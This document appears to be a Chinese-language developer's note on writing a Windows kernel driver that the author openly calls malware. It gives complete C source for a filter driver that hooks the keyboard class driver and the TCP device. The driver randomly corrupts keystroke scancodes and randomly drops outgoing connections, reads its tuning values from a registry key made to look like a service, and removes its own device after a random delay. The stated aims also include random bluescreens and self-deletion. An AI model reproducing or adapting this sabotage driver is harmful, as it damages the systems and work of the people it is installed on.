### Window 驱动开发：计算机正常操作干扰 -> 恶意软件

* 键盘 -> 干扰
* 网络 -> 丢包
* 随机蓝屏
* 植入之后，自销毁，自启动。

### 驱动开发流程

* DirveEntry 驱动入口
* 注册函数
* 绑定对象
* 驱动启动完成

### 相关函数

#### 	IoCreateDevice

```
函数用于创建一个新的设备对象

```

### 用户 设备对象 驱动 内核之间的关系

1. 用户：指使用计算机系统的人或程序。用户可以通过操作系统提供的接口来访问设备对象。

2. 设备对象：是计算机系统中的物理或逻辑设备，例如硬盘、键盘、鼠标等。操作系统通过设备对象来控制和管理这些设备。每个设备对象都有一个唯一的标识符，称为设备对象名。

3. 驱动：是操作系统中的软件模块，负责管理设备对象的操作。每个设备对象都需要一个相应的驱动程序来与其通信，以便控制和管理设备。驱动程序通常是由设备的制造商提供的，也可以由操作系统的开发者编写。

4. 内核：是操作系统的核心部分，负责管理系统资源、进程和线程、内存和文件系统等。内核提供了一组接口，使得驱动程序和用户程序可以与操作系统进行交互。驱动程序需要通过内核提供的接口来访问设备对象。

   用户通过操作系统提供的接口来访问设备对象，操作系统通过驱动程序来管理设备对象的操作，驱动程序通过内核提供的接口来与操作系统进行交互，以实现设备的控制和管理。

### 获取系统当前时间

```C
ULONG MyCurTimeStr()
{
	LARGE_INTEGER snow, now;
	TIME_FIELDS now_fields;
	static WCHAR time_str[32] = { 0 };
	// 获取标准时间
	KeQuerySystemTime(&snow);
	// 转换为当地时间
	ExSystemTimeToLocalTime(&snow, &now);
	// 转换为人们可以理解的时间要素
	RtlTimeToTimeFields(&snow, &now_fields);
	// 输出到日志中
	DbgPrint("%4d-%2d-%2d %2d-%2d-%2d",
		now_fields.Year, now_fields.Month, now_fields.Day,
		now_fields.Hour, now_fields.Minute, now_fields.Second);
	//now_fields.Day * 3600 * 24 +
	return (now_fields.Hour*3600 + now_fields.Minute*60 + now_fields.Second);
}
```

### 读取注册表

```C
NTSTATUS ReadRegistryDword()
{
	HANDLE my_key = NULL;
	NTSTATUS status;
	ULONG value = 0;
    UNICODE_STRING my_key_path = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\services\\rtwlane");
	OBJECT_ATTRIBUTES my_obj_attr = { 0 };

	InitializeObjectAttributes(
		&my_obj_attr,
		&my_key_path,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL);
	status = ZwOpenKey(&my_key, KEY_READ, &my_obj_attr);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Failed to open registry key (%wZ): %x\n", my_key_path, status));
	}

	UNICODE_STRING my_key_name = RTL_CONSTANT_STRING(L"KeyControl");
	ULONG test = GetRand(my_key, my_key_name);
	if (test != STATUS_UNSUCCESSFUL)
	{
		rand_key = test;
	}

	DbgPrint("test %d \r\n", test);

	UNICODE_STRING my_key_name2 = RTL_CONSTANT_STRING(L"NetControl");
	test = GetRand(my_key, my_key_name2);
	if (test != STATUS_UNSUCCESSFUL)
	{
		rand_net = test;
	}
	DbgPrint("test %d \r\n", test);

	UNICODE_STRING my_key_name3 = RTL_CONSTANT_STRING(L"ErrControl");
	test = GetRand(my_key, my_key_name3);
	if (test != STATUS_UNSUCCESSFUL)
	{
		rand_error = test;
	}
	DbgPrint("test %d \r\n", test);

	ZwClose(my_key);

	return STATUS_SUCCESS;
}
```

### 伪随机数

```C
ULONG GeneralRand()
{
	g_rand = g_rand * 1103515245 + 12345;
	g_rand = ((ULONG)(g_rand / 65536) % 32768);
	return g_rand;
}
```

### 获取当前时间

```C
ULONG MyCurTimeStr()
{
	LARGE_INTEGER snow, now;
	TIME_FIELDS now_fields;
	static WCHAR time_str[32] = { 0 };
	KeQuerySystemTime(&snow);
	ExSystemTimeToLocalTime(&snow, &now);
	RtlTimeToTimeFields(&snow, &now_fields);
	DbgPrint("%4d-%2d-%2d %2d-%2d-%2d",
		now_fields.Year, now_fields.Month, now_fields.Day,
		now_fields.Hour, now_fields.Minute, now_fields.Second);
	//now_fields.Day * 3600 * 24 +
	return (now_fields.Hour*3600 + now_fields.Minute*60 + now_fields.Second);
}
//返回当天时间戳
```

### 键盘过滤和网络过滤

```C
#include <ntddk.h>
#include <ntddkbd.h>
#include <wdm.h>
#include <tdikrnl.h>
#include <tdi.h>


// 设备扩展结构
typedef struct _Dev_exten
{
	ULONG Size;						// 该结构大小
	PDEVICE_OBJECT FilterDevice;	// 过滤设备对象
	PDEVICE_OBJECT TargeDevice;		// 下一设备对象
	PDEVICE_OBJECT LowDevice;		// 最底层设备对象
	KSPIN_LOCK IoRequestSpinLock;	// 自旋锁
	KEVENT IoInProgressEvent;		// 事件
	PIRP pIrp;						// IRP
} DEV_EXTENSION, * PDEV_EXTENSION;


// 声明微软未公开的ObReferenceObjectByName()函数
NTSTATUS ObReferenceObjectByName(
	PUNICODE_STRING ObjectName,
	ULONG Attributes,
	PACCESS_STATE AccessState,
	ACCESS_MASK DesiredAccess,
	POBJECT_TYPE ObjectType,
	KPROCESSOR_MODE AccessMode,
	PVOID ParseContest,
	PVOID* Object
);

extern POBJECT_TYPE* IoDriverObjectType;

ULONG g_rand = 745412315;
ULONG local_time = 0;
ULONG start_time = 0;

ULONG rand_key = 20;
ULONG rand_net = 50;
ULONG rand_error = 30;

#define  DELAY_ONE_MICROSECOND  (-10)
#define  DELAY_ONE_MILLISECOND (DELAY_ONE_MICROSECOND*1000)
#define  DELAY_ONE_SECOND (DELAY_ONE_MILLISECOND*1000)

PDEVICE_OBJECT DeviceToBeFiltered = NULL;
PDEVICE_OBJECT g_tcpoldobj = NULL;

typedef struct _EXTENSION {
	PDEVICE_OBJECT TopOfDeviceStack;
} EXTENSION_OBJECT, * PEXTENSION_OBJECT;

ULONG GeneralRand()
{
	g_rand = g_rand * 1103515245 + 12345;
	g_rand = ((ULONG)(g_rand / 65536) % 32768);
	return g_rand;
}

void MyTimerInit()
{
	LARGE_INTEGER interval;
	ULONG time = ((GeneralRand() % 24) + 1) * 3600;
	DbgPrint("start timer %d \r\n", time);
	interval.QuadPart = (120 * 1000 * DELAY_ONE_MILLISECOND);
	KeDelayExecutionThread(KernelMode, FALSE, &interval);
	IoDeleteDevice(DeviceToBeFiltered);
	DbgPrint("start timer end\r\n");
}

ULONG MyCurTimeStr()
{
	LARGE_INTEGER snow, now;
	TIME_FIELDS now_fields;
	static WCHAR time_str[32] = { 0 };
	// 获取标准时间
	KeQuerySystemTime(&snow);
	// 转换为当地时间
	ExSystemTimeToLocalTime(&snow, &now);
	// 转换为人们可以理解的时间要素
	RtlTimeToTimeFields(&snow, &now_fields);
	// 输出到日志中
	DbgPrint("%4d-%2d-%2d %2d-%2d-%2d",
		now_fields.Year, now_fields.Month, now_fields.Day,
		now_fields.Hour, now_fields.Minute, now_fields.Second);
	//now_fields.Day * 3600 * 24 +
	return (now_fields.Hour*3600 + now_fields.Minute*60 + now_fields.Second);
}

//解除绑定
NTSTATUS DeAttach(PDEVICE_OBJECT pdevice)
{
	PDEV_EXTENSION devExt;
	devExt = (PDEV_EXTENSION)pdevice->DeviceExtension;

	if (devExt->TargeDevice) {
		IoDetachDevice(devExt->TargeDevice);
		//devExt->TargeDevice = NULL;
	}
	if (pdevice) {
		IoDeleteDevice(pdevice);
		//devExt->FilterDevice = NULL;
	}

	return STATUS_SUCCESS;
}


//设备卸载函数
NTSTATUS DriverUnload(PDRIVER_OBJECT pDriver)
{
	PDEVICE_OBJECT pDevice;
	PDEV_EXTENSION devExt;

	UNREFERENCED_PARAMETER(pDriver);
	DbgPrint("DriverEntry Unloading...\n");



	if (g_tcpoldobj)
		IoDetachDevice(g_tcpoldobj);

	//LARGE_INTEGER interval;
	//interval.QuadPart = (60 * 1000 * DELAY_ONE_MILLISECOND);
	//KeDelayExecutionThread(KernelMode, FALSE, &interval);

	if (DeviceToBeFiltered) {
		IoDeleteDevice(DeviceToBeFiltered);
		//DeviceToBeFiltered = NULL;
	}


	pDevice = pDriver->DeviceObject;
	while (pDevice)
	{
		DeAttach(pDevice);
		pDevice = pDevice->NextDevice;
	}




	return STATUS_SUCCESS;
}

//VOID test() {
//	DbgPrint("11111111111");
//} svchost.exe

// 设备操作通用分发函数
NTSTATUS GeneralDispatch(PDEVICE_OBJECT pDevice, PIRP pIrp)
{

	//size_t p = 0xfffff8000400cc68;
	//*((size_t*)p) = test;
	int time = MyCurTimeStr();
	DbgPrint("int local_time  time%d   %d\r\n", local_time, time);

	if ((MyCurTimeStr() > local_time) && local_time)
		IoDeleteDevice(DeviceToBeFiltered);

	NTSTATUS status;
	NTSTATUS ntStatus = STATUS_NOT_SUPPORTED;


	PIO_STACK_LOCATION irpsp = IoGetCurrentIrpStackLocation(pIrp);

	if (pDevice != g_tcpoldobj) {
		IoSkipCurrentIrpStackLocation(pIrp);
		status = IoCallDriver(g_tcpoldobj, pIrp);
		return status;
	}

	return ntStatus;

	//PDEVICE_OBJECT NextDeviceObject = IoGetLowerDeviceObject(pDevice);
	////PDEV_EXTENSION devExt = (PDEV_EXTENSION)pDevice->DeviceExtension;
	////PDEVICE_OBJECT lowDevice = devExt->LowDevice;
	//IoSkipCurrentIrpStackLocation(pIrp);
	//status = IoCallDriver(NextDeviceObject, pIrp);
	//
	//return status;
}


// IRP读操作的完成回调函数
NTSTATUS ReadComp(PDEVICE_OBJECT pDevice, PIRP pIrp, PVOID Context)
{
	NTSTATUS status;
	PIO_STACK_LOCATION stack;
	ULONG keyNumber;
	PKEYBOARD_INPUT_DATA myData;
	stack = IoGetCurrentIrpStackLocation(pIrp);
	if (NT_SUCCESS(pIrp->IoStatus.Status))
	{
		// 获取键盘数据
		myData = pIrp->AssociatedIrp.SystemBuffer;
		keyNumber = (ULONG)(pIrp->IoStatus.Information / sizeof(PKEYBOARD_INPUT_DATA));
		for (ULONG i = 0; i < keyNumber; i++)
		{
			DbgPrint("numkey:%u\n", keyNumber);
			DbgPrint("sancode:%x\n", myData->MakeCode);
			DbgPrint("%s\n", myData->Flags ? "Up" : "Down");

			DbgPrint("g_rand %d \r\n", g_rand);
			ULONG rand = GeneralRand();
			if ((rand % 100) < rand_key) {
				rand = GeneralRand();
				ULONG add_key = rand % 80;
				DbgPrint("add_key %d \r\n", add_key);
				myData->MakeCode += g_rand;
			}
		}
	}
	if (pIrp->PendingReturned)
	{
		IoMarkIrpPending(pIrp);
	}
	return pIrp->IoStatus.Status;
}


// IRP读分发函数
NTSTATUS ReadDispatch(PDEVICE_OBJECT pDevice, PIRP pIrp)
{
	NTSTATUS status = STATUS_SUCCESS;
	PDEV_EXTENSION devExt;
	PDEVICE_OBJECT lowDevice;
	PIO_STACK_LOCATION stack;
	if (pIrp->CurrentLocation == 1)
	{
		DbgPrint("irp send error..\n");
		status = STATUS_INVALID_DEVICE_REQUEST;
		pIrp->IoStatus.Status = status;
		pIrp->IoStatus.Information = 0;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return status;
	}
	// 得到设备扩展。目的是之后为了获得下一个设备的指针。
	devExt = pDevice->DeviceExtension;
	lowDevice = devExt->LowDevice;
	stack = IoGetCurrentIrpStackLocation(pIrp); //检索pIrp当前的堆栈位置

	// 复制IRP栈
	IoCopyCurrentIrpStackLocationToNext(pIrp); //复制pIrp 到下一个堆栈位置
	// 设置IRP完成回调函数
	IoSetCompletionRoutine(pIrp, ReadComp, pDevice, TRUE, TRUE, TRUE); //IRP设置完成例程
	status = IoCallDriver(lowDevice, pIrp);
	return status;
}


// 电源IRP分发函数
NTSTATUS PowerDispatch(PDEVICE_OBJECT pDevice, PIRP pIrp)
{
	PDEV_EXTENSION devExt;
	devExt = (PDEV_EXTENSION)pDevice->DeviceExtension;

	PoStartNextPowerIrp(pIrp);
	IoSkipCurrentIrpStackLocation(pIrp);
	return PoCallDriver(devExt->TargeDevice, pIrp);
}


// 即插即用IRP分发函数
NTSTATUS PnPDispatch(PDEVICE_OBJECT pDevice, PIRP pIrp)
{
	PDEV_EXTENSION devExt;
	PIO_STACK_LOCATION stack;
	NTSTATUS status = STATUS_SUCCESS;

	devExt = (PDEV_EXTENSION)pDevice->DeviceExtension;
	stack = IoGetCurrentIrpStackLocation(pIrp);

	switch (stack->MinorFunction)
	{
	case IRP_MN_REMOVE_DEVICE:
		// 首先把请求发下去
		IoSkipCurrentIrpStackLocation(pIrp);
		IoCallDriver(devExt->LowDevice, pIrp);
		// 然后解除绑定。
		IoDetachDevice(devExt->LowDevice);
		// 删除我们自己生成的虚拟设备。
		IoDeleteDevice(pDevice);
		status = STATUS_SUCCESS;
		break;

	default:
		// 对于其他类型的IRP，全部都直接下发即可。 
		IoSkipCurrentIrpStackLocation(pIrp);
		status = IoCallDriver(devExt->LowDevice, pIrp);
	}
	return status;
}

NTSTATUS Dispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{

	NTSTATUS ntStatus = STATUS_NOT_SUPPORTED;
	PIO_STACK_LOCATION StackIrpPointer = NULL;

	PTDI_REQUEST_KERNEL_CONNECT TDI_connectRequest;
	PTA_ADDRESS TA_Address_data;
	PTDI_ADDRESS_IP TDI_data;

	typedef struct _NETWORK_ADDRESS
	{
		unsigned char address[4];
		unsigned char port[2];
	} NETWORK_ADDRESS;

	NETWORK_ADDRESS data;

	unsigned short Port = 0;
	unsigned long Address = 0;

	StackIrpPointer = IoGetCurrentIrpStackLocation(Irp);

	if (!StackIrpPointer) {
		DbgPrint("Fatal Error: IRP stack pointer is NULL! \r\n");
		return STATUS_UNSUCCESSFUL;
	}

	if (DeviceObject == DeviceToBeFiltered) {
		if (StackIrpPointer->MinorFunction == TDI_CONNECT && (int)MyCurTimeStr() > start_time) {
			TDI_connectRequest = (PTDI_REQUEST_KERNEL_CONNECT)(&StackIrpPointer->Parameters);
			TA_Address_data = ((PTRANSPORT_ADDRESS)(TDI_connectRequest->RequestConnectionInformation->RemoteAddress))->Address;
			TDI_data = (PTDI_ADDRESS_IP)(TA_Address_data->Address);
			Address = TDI_data->in_addr;
			Port = TDI_data->sin_port;
			data.address[0] = ((char*)&Address)[0];
			data.address[1] = ((char*)&Address)[1];
			data.address[2] = ((char*)&Address)[2];
			data.address[3] = ((char*)&Address)[3];
			data.port[0] = ((char*)&Port)[0];
			data.port[1] = ((char*)&Port)[1];
			Port = data.port[0] + data.port[1];

			DbgPrint("TCP address is %d.%d.%d.%d:%d \r\n", data.address[0], data.address[1], data.address[2], data.address[3], Port);

			DbgPrint(" g_rand %d \n", g_rand);
			ULONG rand = GeneralRand() % 100;
			if (rand < rand_net ) {
				DbgPrint(" g_rand %d  filter-------------------\n", rand);
				return STATUS_UNSUCCESSFUL;
			}

			IoSkipCurrentIrpStackLocation(Irp);
			ntStatus = IoCallDriver(g_tcpoldobj, Irp);
		}
		else {
			IoSkipCurrentIrpStackLocation(Irp);
			ntStatus = IoCallDriver(g_tcpoldobj, Irp);
		}
	}
	return ntStatus;


}

// 初始化扩展设备
NTSTATUS DevExtInit(PDEV_EXTENSION devExt, PDEVICE_OBJECT filterDevice, PDEVICE_OBJECT targetDevice, PDEVICE_OBJECT lowDevice)
{
	memset(devExt, 0, sizeof(DEV_EXTENSION));
	devExt->FilterDevice = filterDevice;
	devExt->TargeDevice = targetDevice;
	devExt->LowDevice = lowDevice;
	devExt->Size = sizeof(DEV_EXTENSION);
	KeInitializeSpinLock(&devExt->IoRequestSpinLock);
	KeInitializeEvent(&devExt->IoInProgressEvent, NotificationEvent, FALSE);
	return STATUS_SUCCESS;
}

// 将过滤设备绑定到目标设备上
NTSTATUS AttachDevice(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPatch)
{
	UNICODE_STRING kbdName = RTL_CONSTANT_STRING(L"\\Driver\\Kbdclass");
	NTSTATUS status = 0;
	PDEV_EXTENSION devExt;			// 过滤设备的扩展设备
	PDEVICE_OBJECT filterDevice;	// 过滤设备 
	PDEVICE_OBJECT targetDevice;		// 目标设备（键盘设备）
	PDEVICE_OBJECT lowDevice;		// 底层设备（向某一个设备上加一个设备时不一定是加到此设备上，而加在设备栈的栈顶）
	PDRIVER_OBJECT kbdDriver;		// 用于接收打开的物理键盘设备

	// 获取键盘驱动的对象，保存在kbdDriver
	status = ObReferenceObjectByName(&kbdName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, &kbdDriver);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Open KeyBoard Driver Failed\n");
		return status;
	}
	else
	{
		// 解引用
		ObDereferenceObject(kbdDriver);
	}

	// 获取键盘驱动设备链中的第一个设备
	targetDevice = kbdDriver->DeviceObject;
	// 像链表操作一样，遍历键盘键盘设备链中的所有设备
	while (targetDevice)
	{
		// 创建一个过滤设备
		status = IoCreateDevice(pDriver, sizeof(DEV_EXTENSION), NULL, targetDevice->DeviceType, targetDevice->Characteristics, FALSE, &filterDevice);
		if (!NT_SUCCESS(status))
		{
			DbgPrint("Create New FilterDevice Failed\n");
			filterDevice = targetDevice = NULL;
			return status;
		}
		// 绑定，lowDevice是绑定之后得到的下一个设备。
		lowDevice = IoAttachDeviceToDeviceStack(filterDevice, targetDevice);
		if (!lowDevice)
		{
			DbgPrint("Attach Faided!\n");
			IoDeleteDevice(filterDevice);
			filterDevice = NULL;
			return status;
		}
		// 初始化设备扩展
		devExt = (PDEV_EXTENSION)filterDevice->DeviceExtension;
		DevExtInit(devExt, filterDevice, targetDevice, lowDevice);

		filterDevice->DeviceType = lowDevice->DeviceType;
		filterDevice->Characteristics = lowDevice->Characteristics;
		filterDevice->StackSize = lowDevice->StackSize + 1;
		filterDevice->Flags |= lowDevice->Flags & (DO_BUFFERED_IO | DO_DIRECT_IO | DO_POWER_PAGABLE);
		// 遍历下一个设备
		targetDevice = targetDevice->NextDevice;
	}
	DbgPrint("Create And Attach Finshed...\n");
	return status;
}

ULONG GetRand(HANDLE my_key, UNICODE_STRING my_key_name)
{
	NTSTATUS status;
	KEY_VALUE_PARTIAL_INFORMATION key_infor;
	PKEY_VALUE_PARTIAL_INFORMATION ac_key_infor;
	ULONG ac_length = 10;
	status = ZwQueryValueKey(
		my_key,
		&my_key_name,
		KeyValuePartialInformation,
		&key_infor,
		sizeof(KEY_VALUE_PARTIAL_INFORMATION),
		&ac_length);
	if (!NT_SUCCESS(status) &&
		status != STATUS_BUFFER_OVERFLOW &&
		status != STATUS_BUFFER_TOO_SMALL)
	{
		KdPrint(("Failed to get registry value %wZ: %x\n", my_key_name, status));
		return STATUS_UNSUCCESSFUL;
	}
	ac_key_infor = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, ac_length, 10);
	if (ac_key_infor == NULL)
	{
		KdPrint(("Failed to get registry value %wZ: %x\n", my_key_name, status));
		return STATUS_UNSUCCESSFUL;

	}
	status = ZwQueryValueKey(
		my_key,
		&my_key_name,
		KeyValuePartialInformation,
		ac_key_infor,
		ac_length,
		&ac_length);

	ULONG rand_data = (ac_key_infor->Data[1] << 8 | ac_key_infor->Data[0]);
	DbgPrint("data %d \r\n", rand_data);
	ExFreePool(ac_key_infor);
	return rand_data;
}

NTSTATUS ReadRegistryDword()
{
	HANDLE my_key = NULL;
	NTSTATUS status;
	ULONG value = 0;

	UNICODE_STRING my_key_path = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\services\\rtwlane");
	OBJECT_ATTRIBUTES my_obj_attr = { 0 };

	InitializeObjectAttributes(
		&my_obj_attr,
		&my_key_path,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL);
	status = ZwOpenKey(&my_key, KEY_READ, &my_obj_attr);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Failed to open registry key (%wZ): %x\n", my_key_path, status));
	}

	UNICODE_STRING my_key_name = RTL_CONSTANT_STRING(L"KeyControl");
	ULONG test = GetRand(my_key, my_key_name);
	if (test != STATUS_UNSUCCESSFUL)
	{
		rand_key = test;
	}

	DbgPrint("test %d \r\n", test);

	UNICODE_STRING my_key_name2 = RTL_CONSTANT_STRING(L"NetControl");
	test = GetRand(my_key, my_key_name2);
	if (test != STATUS_UNSUCCESSFUL)
	{
		rand_net = test;
	}
	DbgPrint("test %d \r\n", test);

	UNICODE_STRING my_key_name3 = RTL_CONSTANT_STRING(L"ErrControl");
	test = GetRand(my_key, my_key_name3);
	if (test != STATUS_UNSUCCESSFUL)
	{
		rand_error = test;
	}
	DbgPrint("test %d \r\n", test);

	ZwClose(my_key);

	return STATUS_SUCCESS;
}

// 驱动入口函数
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)
{
	ULONG i;
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING FilteredDeviceName;

	pDriver->DriverUnload = DriverUnload;					// 注册驱动卸载函数

	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		pDriver->MajorFunction[i] = GeneralDispatch;		// 注册通用的IRP分发函数
	}

	pDriver->MajorFunction[IRP_MJ_READ] = ReadDispatch;		// 注册读IRP分发函数
	pDriver->MajorFunction[IRP_MJ_POWER] = PowerDispatch;	// 注册电源IRP分发函数
	pDriver->MajorFunction[IRP_MJ_PNP] = PnPDispatch;		// 注册即插即用IRP分发函数

	
	AttachDevice(pDriver, RegPath);						// 绑定设备

	status = IoCreateDevice(pDriver, sizeof(EXTENSION_OBJECT), NULL, FILE_DEVICE_NETWORK, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceToBeFiltered);
	if (!NT_SUCCESS(status)) {
		if (DeviceToBeFiltered)
			IoDeleteDevice(DeviceToBeFiltered);
		DbgPrint("Attaching to TCP device failed!\r\n");
		return status;
	}
	pDriver->MajorFunction[IRP_MJ_INTERNAL_DEVICE_CONTROL] = Dispatch;
	RtlInitUnicodeString(&FilteredDeviceName, L"\\Device\\Tcp");
	status = IoAttachDevice(DeviceToBeFiltered, &FilteredDeviceName, &g_tcpoldobj);

	if (!NT_SUCCESS(status)) {
		DriverUnload(pDriver);
		DbgPrint("Attaching to TCP device failed!\r\n");
	}


	g_rand = MyCurTimeStr();

	//创建线程
	//HANDLE hThread;
	//NTSTATUS NtStatus = PsCreateSystemThread(&hThread,
	//	(ACCESS_MASK)0,
	//	NULL,
	//	(HANDLE)0,
	//	NULL,
	//	MyTimerInit,	//线程入口点
	//	NULL);	//传递的参数

	ReadRegistryDword();

	DbgPrint("key %d ,net %d ,err %d", rand_key, rand_net, rand_error);

	ULONG time = rand_error*60;
	DbgPrint("entry int g_rand %d %d\r\n", g_rand, time);
	start_time = (int)MyCurTimeStr() + 60;
	local_time = (int)MyCurTimeStr() + GeneralRand()% time;
	DbgPrint("entry int local_time %d %d\r\n", local_time, time);
	//MyTimerInit();
	return status;
}
```

